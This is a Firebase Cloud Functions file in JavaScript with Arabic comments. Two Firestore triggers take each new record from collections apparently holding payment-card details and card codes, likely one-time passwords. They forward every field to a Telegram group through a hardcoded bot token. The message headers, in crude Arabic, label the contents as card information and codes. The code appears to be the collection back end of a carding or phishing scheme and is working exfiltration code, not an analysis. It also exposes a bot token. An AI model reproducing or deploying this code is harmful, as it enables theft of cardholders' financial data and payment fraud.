const functions = require("firebase-functions");
const admin = require("firebase-admin");
const axios = require("axios");

admin.initializeApp();

exports.sendTelegramNotification = functions.firestore
    .document("vfdvfdvfvf/{docId}")
    .onCreate((snap, context) => {
      const newData = snap.data();

      let messageText = "معلومات البطاقة يا ملا الطيز:\n";
      for (const key in newData) {
      // استخدام Object.prototype.hasOwnProperty.call() للتحقق من الخصائص
        if (Object.prototype.hasOwnProperty.call(newData, key)) {
          messageText += `- ${newData[key]}\n`;
        }
      }

      const telegramURL = `https://api.telegram.org/bot6485066211:AAFXASEDSyZ4iHTGW-E9CSCtpjCUKhUQbSA/sendMessage`;

      axios.post(telegramURL, {
        chat_id: "-4144732454",
        text: messageText,
      })
          .then((response) => {
            // إجراءات في حال نجاح الطلب
          })
          .catch((error) => {
            // إجراءات في حال وجود خطأ
          });
    });

exports.sendTelegramNot = functions.firestore
    .document("codecard/{docId}")
    .onCreate((snap, context) => {
      const newData = snap.data();

      let messageText = "الكود يا ملا الزب:\n";
      for (const key in newData) {
      // استخدام Object.prototype.hasOwnProperty.call() للتحقق من الخصائص
        if (Object.prototype.hasOwnProperty.call(newData, key)) {
          messageText += `- ${newData[key]}\n`;
        }
      }

      const telegramURL = `https://api.telegram.org/bot6485066211:AAFXASEDSyZ4iHTGW-E9CSCtpjCUKhUQbSA/sendMessage`;

      axios.post(telegramURL, {
        chat_id: "-4144732454",
        text: messageText,
      })
          .then((response) => {
            // إجراءات في حال نجاح الطلب
          })
          .catch((error) => {
            // إجراءات في حال وجود خطأ
          });
    });
